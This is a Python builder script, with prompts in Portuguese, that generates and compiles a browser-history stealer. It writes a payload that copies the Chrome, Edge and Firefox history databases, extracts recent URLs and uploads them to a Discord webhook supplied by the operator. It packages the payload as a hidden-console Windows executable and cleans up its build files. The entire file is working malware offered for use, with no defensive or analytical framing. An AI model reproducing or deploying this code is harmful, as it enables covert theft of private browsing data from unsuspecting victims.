import os
import sys
import time
import subprocess
import shutil

def build_historylogger():
    print("="*50)
    print("HISTORY LOGGER BUILDER")
    print("="*50)
    
    webhook = input("Digite o Webhook do Discord: ").strip()
    
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        print("Webhook inválido!")
        return
    
    history_script = f'''
import os
import sqlite3
import shutil
import requests
import tempfile

WEBHOOK_URL = "{webhook}"

def send_file_to_webhook(file_path):
    try:
        with open(file_path, "rb") as f:
            files = {{"file": (os.path.basename(file_path), f)}}
            response = requests.post(WEBHOOK_URL, files=files, timeout=10)
    except Exception as e:
        pass

def dump_history_from_db(history_path, browser_name):
    if not os.path.exists(history_path):
        return None

    temp_file = tempfile.NamedTemporaryFile(delete=False)
    temp_history = temp_file.name
    temp_file.close()
    shutil.copy2(history_path, temp_history)

    conn = sqlite3.connect(temp_history)
    cursor = conn.cursor()
    query = "SELECT url FROM urls ORDER BY last_visit_time DESC LIMIT 20"

    history_lines = []
    try:
        cursor.execute(query)
        results = cursor.fetchall()
        for url, in results:
            if url:
                history_lines.append(url)
    except Exception:
        pass
    finally:
        cursor.close()
        conn.close()
        os.remove(temp_history)

    return history_lines

def dump_firefox_history():
    user_profile = os.environ.get("USERPROFILE")
    places_path = os.path.join(user_profile, r"AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
    if not os.path.exists(places_path):
        return None

    profiles = [d for d in os.listdir(places_path) if os.path.isdir(os.path.join(places_path, d))]
    history_lines = []
    
    for profile in profiles:
        history_db = os.path.join(places_path, profile, "places.sqlite")
        if not os.path.exists(history_db):
            continue

        temp_file = tempfile.NamedTemporaryFile(delete=False)
        temp_history = temp_file.name
        temp_file.close()
        shutil.copy2(history_db, temp_history)

        try:
            conn = sqlite3.connect(temp_history)
            cursor = conn.cursor()
            cursor.execute("SELECT url FROM moz_places ORDER BY last_visit_date DESC LIMIT 20")
            for url, in cursor.fetchall():
                if url:
                    history_lines.append(url)
            cursor.close()
            conn.close()
        except Exception:
            pass
        finally:
            os.remove(temp_history)

    return history_lines if history_lines else None

def main():
    user_profile = os.environ.get("USERPROFILE")
    history_all = []

    chrome_path = os.path.join(user_profile, r"AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
    chrome_history = dump_history_from_db(chrome_path, "Chrome")
    if chrome_history:
        history_all.extend(chrome_history)

    edge_path = os.path.join(user_profile, r"AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History")
    edge_history = dump_history_from_db(edge_path, "Edge")
    if edge_history:
        history_all.extend(edge_history)

    firefox_history = dump_firefox_history()
    if firefox_history:
        history_all.extend(firefox_history)

    if not history_all:
        return

    output_file = "browser_history_dump.txt"
    with open(output_file, "w", encoding="utf-8") as f:
        for url in history_all:
            f.write(url + "\\n")

    send_file_to_webhook(output_file)
    os.remove(output_file)

if __name__ == "__main__":
    main()
'''

    script_path = "historylogger.py"
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(history_script)
    
    print("Compilando...")
    try:
        subprocess.run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--noconfirm", script_path], check=True)
        
        downloads = os.path.join(os.path.expanduser("~"), "Downloads")
        final_path = os.path.join(downloads, "historylogger.exe")
        
        if os.path.exists(os.path.join("dist", "historylogger.exe")):
            shutil.move(os.path.join("dist", "historylogger.exe"), final_path)
            print(f"History Logger criado: {final_path}")
    except Exception as e:
        print(f"Erro: {e}")
    
    # Limpeza
    for folder in ["build", "dist", "__pycache__"]:
        shutil.rmtree(folder, ignore_errors=True)
    for file in ["historylogger.py", "historylogger.spec"]:
        os.remove(file)

if __name__ == "__main__":
    build_historylogger()